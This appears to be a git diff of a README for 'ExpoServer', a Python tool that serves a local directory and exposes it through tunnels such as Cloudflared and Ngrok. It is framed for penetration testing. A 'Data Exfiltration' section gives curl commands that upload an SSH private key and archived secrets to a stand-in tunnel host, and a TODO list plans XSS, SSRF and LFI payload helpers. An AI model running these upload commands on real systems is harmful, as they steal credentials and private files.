@@ -1,12 +1,10 @@
 <h2 align="center">
-  🪝 Webhook Server Tunnel
+  🪝 ExpoServer
 </h2>
 
-
- 
 <p align="center">
-    <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2FSearchToolkit">
-        <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fwebhook&label=Visitors&countColor=%2337d67a" />
+    <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fexposerver">
+        <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fexposerver&label=Visitors&countColor=%2337d67a" />
     </a>
     <a href="https://www.facebook.com/UEVOLVJU">
         <img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" alt="Facebook">
@@ -23,16 +21,10 @@
     <a href="mailto:l0n3m4n@proton.me">
       <img src="https://img.shields.io/badge/ProtonMail-6001D2?style=for-the-badge&logo=protonmail&logoColor=white" alt="ProtonMail">
     </a>
-    <a href="https://github.com/l0n3m4n/SearchToolkit/blob/main/assets/contributing.md">
-      <img src="https://img.shields.io/badge/Contribute-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
-  </a>
 </p>
 <br/>
 
 This Python script serves a local directory over HTTP and exposes it securely to the internet via a reverse tunnel using either:
-
-- Serveo (SSH-based tunneling)
-- Cloudflared (Cloudflare Tunnel)
 
 It’s especially useful for:
 
@@ -46,59 +38,69 @@ It’s especially useful for:
 
 ---
 
-## 🚀 Features
+## ✨ Features
 
 - HTTP server using Python's built-in modules
 - Logs all request headers to `headers.log`
 - Expose server via:
   - 🌐 [Serveo](https://serveo.net)
   - ☁️ [Cloudflared](https://developers.cloudflare.com/cloudflare-one/)
-- ANSI-colored terminal output
-- Easy to use CLI
+  -  tunnelling [Ngrok](https://ngrok.com/)
+  - 🚇 [Localtunnel](https://theboroer.github.io/localtunnel-www/)
+- Upload file, View metadata, view browser logs
+- Optional user interface (Darkmode, Lighmode, Hackermode)
+- Self-updating mechanism (Script update)
+- Easy installation to (/usr/local/bin, custom path)
+- Verbose mode for detailed output and set timeout (seconds)
+- Authentication mechanism (username:password) etc.
 
 ---
 
 ## 🚀 Banner  
 ```bash
-❯ python3 webhook.py -h
+❯ exposerver.py -h
 
-     .->    (`-')  _<-.(`-')  (`-').->                      <-.(`-')  
- (`(`-')/`) ( OO).-/ __( OO)  (OO )__      .->        .->    __( OO)  
-,-`( OO).',(,------.'-'---.\ ,--. ,'-'(`-')----. (`-')----. '-'. ,--. 
-|  |\\  |  | |  .---'| .-. (/ |  | |  |( OO).-.  '( OO).-.  '|  .'   / 
-|  | '.|  |(|  '--. | '-' `.)|  `-'  |( _) | |  |( _) | |  ||      /) 
-|  |.'.|  | |  .--' | /`'.  ||  .-.  | \\|  |)|  | \\|  |)|  ||  .   '  
-|   ,'.   | |  `---.| '--'  /|  | |  |  '  '-'  '  '  '-'  '|  |\\   \\ 
-`--'   '--' `------'`------' `--' `--'   `-----'    `-----' `--' '--' 
-     Author: l0n3m4n | Version: 1.1.3 | Tunneling local Server 
+___________                                                            
+\_   _____/__  _________   ____  ______ ______________  __ ___________
+ |    __)_\  \/  /\____ \ /  _ \/  ___// __ \_  __ \  \/ // __ \_  __ \
+ |        \>    < |  |_> >  <_> )___ \\  ___/|  | \/\   /\  ___/|  | \/
+/_______  /__/\_ \|   __/ \____/____  >\___  >__|    \_/  \___  >__|   
+        \/      \/|__|              \/     \/                 \/       
+     Author: l0n3m4n | Version: 1.3.0 | Tunneling local Server 
 
-usage: webhook.py [-h] [-p PORT] [-d DIRECTORY] [--shutdown-timer SHUTDOWN_TIMER] (--serveo |
-                  --cloudflared | --ngrok | --localtunnel) [--exiftool]
+usage: exposerver.py [-h] [-v] [-p PORT] [-d DIRECTORY] [--auth AUTH] [--timeout TIMEOUT]
+                     [--serveo | --cloudflared | --ngrok | --localtunnel] [-u] [-sl]
 
-📡 Serve a local directory and expose it via a tunnel (Serveo, Cloudflared, Ngrok, LocalTunnel).
+📡 Serve a local directory and expose it via a tunnel (Serveo, Cloudflared, Ngrok).
 
-options:
-  -h, --help            show this help message and exit
-  -p, --port PORT       Local port to serve (default: 80)
-  -d, --directory DIRECTORY
-                        Directory to serve (default: current dir)
-  --shutdown-timer SHUTDOWN_TIMER
-                        Automatically shut down after N seconds
-  --serveo              Use Serveo tunnel
-  --cloudflared         Use Cloudflared tunnel
-  --ngrok               Use Ngrok tunnel
-  --localtunnel         Use LocalTunnel tunnel
-  --exiftool            Use ExifTool for metadata extraction
-
-
-    Examples:                                                                                         
-      python3 webhook.py -p 8080 --serveo --exiftool -d ~/my-site --shutdown-timer 600 -shutdown-timer 600                 
-      python3 webhook.py -p 80 -d ~/my-site --cloudflared --exiftool                                  
-      python3 webhook.py -p 3000 -d ~/my-site --ngrok                                                 
-      python3 webhook.py -p 8080 -d ~/my-site --localtunnel  
+options:                                                                                             
+  -h, --help                 show this help message and exit                                         
+  -v, --verbose              Enable verbose output.                                                  
+  -p, --port PORT            Local port to serve (default: 80)                                       
+  -d, --directory DIRECTORY  Directory to serve (default: .)                                         
+  --auth AUTH                Enable basic authentication (format: username:password)                 
+  --timeout TIMEOUT          Automatically shut down the server after a specified time in seconds.   
+                                                                                                     
+Tunnel Options:                                                                                      
+  --serveo                   Use Serveo tunnel                                                       
+  --cloudflared              Use Cloudflared tunnel                                                  
+  --ngrok                    Use Ngrok tunnel                                                        
+  --localtunnel              Use LocalTunnel tunnel                                                  
+                                                                                                     
+Script Management:                                                                                   
+  -u, --update               Update the script from GitHub.                                          
+  -sl, --save-local          Save the script to /usr/local/bin                                       
+                                                                                                     
+                                                                                                     
+Examples:                                                                                            
+   python3 exposerver.py -p 8080 --serveo                                                            
+   python3 exposerver.py -p 80 -d /var/www/html --cloudflared                                        
+   python3 exposerver.py -p 3000 -d ~/my-site --ngrok                                                
+   python3 exposerver.py -p 8080 -d ~/my-site --localtunnel                                          
+   python3 exposerver.py -p 8080 --cloudflared --auth myuser:mypassword  
 ```
 
-## 🛠 Requirements
+## 🛠️ Requirements
 
   - Python 3.6+
   - Internet access (for tunnels)
@@ -114,57 +116,72 @@ options:
 ## 📦 Installation
 
 ```bash
-# Clone the repo
-git clone https://github.com/l0n3m4n/webhook.git
-cd webhook 
-pip install -r requirements.txt --break-system-packages
+# Clone the repository
+git clone https://github.com/l0n3m4n/exposerver.git
 
-# Make it executable
-chmod +x webhook.py 
+# Navigate to the project directory
+cd exposerver
+
+# Run the script with the --save-local flag to install it to /usr/local/bin
+# This will also install all the required dependencies
+python3 exposerver.py --save-local
 ```
 
-## 🐧 Kali linux (debian,ubuntu)
-```bash
-# system update
-sudo apt update
-
-# dependencies
-sudo apt install -y curl gnupg lsb-release
-
-# Add Cloudflare's GPG key
-curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo gpg --dearmor -o /usr/share/keyrings/cloudflare-main.gpg
-
-# Add the Cloudflare apt repository
-echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflared.list
-
-# Update apt again and Install
-sudo apt update && sudo apt install cloudflared -y 
-```
 ## 📡 Usage
-```bash
-sudo python3 webhook.py -p 8080 --serveo -d /var/www/html
-```
-![usage](assets/usage.png)
-![output](assets/output.png)
-![status_codes](assets/status_codes.png)
-![headers_log](assets/headers_logs.png)
- 
 
-## 🔁 Data exfiltration
 ```bash
+# Serve the current directory on port 8080 with Serveo
+sudo exposerver -p 8080 --serveo
+
+# Serve a specific directory on port 80 with Cloudflared
+sudo exposerver -p 80 -d /var/www/html --cloudflared
+
+# Use ngrok to expose a site on port 3000
+sudo exposerver -p 3000 -d ~/my-site --ngrok
+
+# Use localtunnel to expose a site on port 8080
+sudo exposerver -p 8080 -d ~/my-site --localtunnel
+
+# Enable basic authentication
+sudo exposerver -p 8080 --cloudflared --auth myuser:mypassword
+
+# Update the script to the latest version
+exposerver -u
+```
+
+## 📂 Host current directory
+![banner](/assets/images/banner.png)
+
+## 📝 Headers Logs
+![headers](/assets/images/header_log.png) 
+
+## 🖼️ User Interface 
+![ui](/assets/images/UI.png)
+
+## 🔐 Authentication 
+![auth](/assets/images/browser_auth.png)
+
+## 🗃️ View Metadata
+![exiftool](/assets/images/metadata.png)
+
+
+
+
+## 🔁 Data Exfiltration
+
+```bash
+# Upload a zip file
 curl -X POST http://abc123.cloudflaretunnel.com/upload --data-binary "@loot.zip"
 
+# Upload a ssh key
 curl -F "file=@/home/user/.ssh/id_rsa" https://abc123.cloudflareTunnel.com/upload
 
+# Archive and upload a directory
 tar czf secrets.tar.gz ~/Documents/secrets
 curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
-
 ```
 
-## 🔐 Security Notes
-- This tool uses SSH for Serveo and a reverse proxy for Cloudflared.
-- Ensure you trust any services you expose publicly.
-
+ 
 ## ✅ TODO List
 
 ### 🔌 Tunnel Providers
@@ -182,11 +199,16 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 - [x] Web-based directory listing with download buttons
 - [x] File upload support for data exfiltration
 - [x] Log incoming HTTP requests (IP, User-Agent, Time)
+- [x] Automatic file list refresh after upload
+
+### 📜 Script Management
+- [x] Self-updating mechanism
+- [x] Easy installation to `/usr/local/bin`
 
 ### ⏱️ Control & Automation
 - [x] Implement auto-shutdown timer
-- [ ] Auto-reconnect/restart tunnels on failure
-- [ ] Add password protection for server access
+- [x] Auto-reconnect/restart tunnels on failure
+- [x] Add password protection for server access
 
 ### 🧪 Exploitation Helpers
 - [ ] Generate payload templates:
@@ -194,14 +216,10 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
   - [ ] CSRF Proof of Concept
   - [ ] LFI/RFI test cases
   - [ ] SSRF test URLs
-- [ ] Webhook listener module (e.g., for Blind XSS or SSRF detection)
+- [ ] Listener module (e.g., for Blind XSS or SSRF detection)
 - [ ] Integrate with Interactsh or Burp Collaborator
-
-### 🛠️ Developer Tools
-- [ ] Proxy chaining to local tools like Burp Suite
-- [ ] Optional local logging
-- [ ] QR code generator for public URLs
-- [x] CLI output beautification (colors, banners, progress indicators)
+ 
+ 
 
 ---
 
